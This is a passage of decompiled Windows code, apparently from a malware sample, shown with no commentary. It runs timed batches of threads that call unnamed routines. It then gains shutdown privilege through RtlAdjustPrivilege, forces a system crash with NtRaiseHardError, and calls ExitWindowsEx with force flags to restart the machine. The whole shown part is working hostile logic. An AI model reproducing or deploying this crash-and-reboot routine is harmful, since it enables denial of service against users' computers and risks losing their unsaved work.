  v11 = CreateThread(0, 0, sub_140001ED0, 0, 0, 0);
  Sleep(0x36B0u);
  TerminateThread(v10, 0);
  CloseHandle(v10);
  TerminateThread(v11, 0);
  CloseHandle(v11);
  Sleep(0xFA0u);
  v12 = CreateThread(0, 0, sub_1400020D0, 0, 0, 0);
  v13 = CreateThread(0, 0, sub_140001ED0, 0, 0, 0);
  Sleep(0x32C8u);
  TerminateThread(v12, 0);
  CloseHandle(v12);
  TerminateThread(v13, 0);
  CloseHandle(v13);
  Sleep(0x9C4u);
  CreateThread(0, 0, sub_1400020D0, 0, 0, 0);
  CreateThread(0, 0, sub_140001B90, 0, 0, 0);
  CreateThread(0, 0, sub_140001ED0, 0, 0, 0);
  CreateThread(0, 0, sub_1400017E0, 0, 0, 0);
  Sleep(0x3A98u);
  LibraryA = LoadLibraryA("ntdll");
  v15 = LibraryA;
  if ( LibraryA )
  {
    RtlAdjustPrivilege = GetProcAddress(LibraryA, "RtlAdjustPrivilege");
    NtRaiseHardError = GetProcAddress(v15, "NtRaiseHardError");
    v18 = (void (__fastcall *)(_QWORD, _QWORD, _QWORD, _QWORD, _DWORD, _QWORD))NtRaiseHardError;
    if ( RtlAdjustPrivilege )
    {
      if ( NtRaiseHardError )
      {
        ((void (__fastcall *)(__int64, __int64, _QWORD, char *))RtlAdjustPrivilege)(19, 1, 0, v22);
        v18(3331596393, 0, 0, 0, 6, v23);
      }
    }
  }
  CurrentProcess = GetCurrentProcess();
  OpenProcessToken(CurrentProcess, 0x28u, &TokenHandle);
  LookupPrivilegeValueW(0, L"SeShutdownPrivilege", &NewState.Privileges[0].Luid);
  NewState.PrivilegeCount = 1;
  NewState.Privileges[0].Attributes = 2;
  AdjustTokenPrivileges(TokenHandle, 0, &NewState, 0, 0, 0);
  ExitWindowsEx(6u, 0x10007u);
  return 0;
}
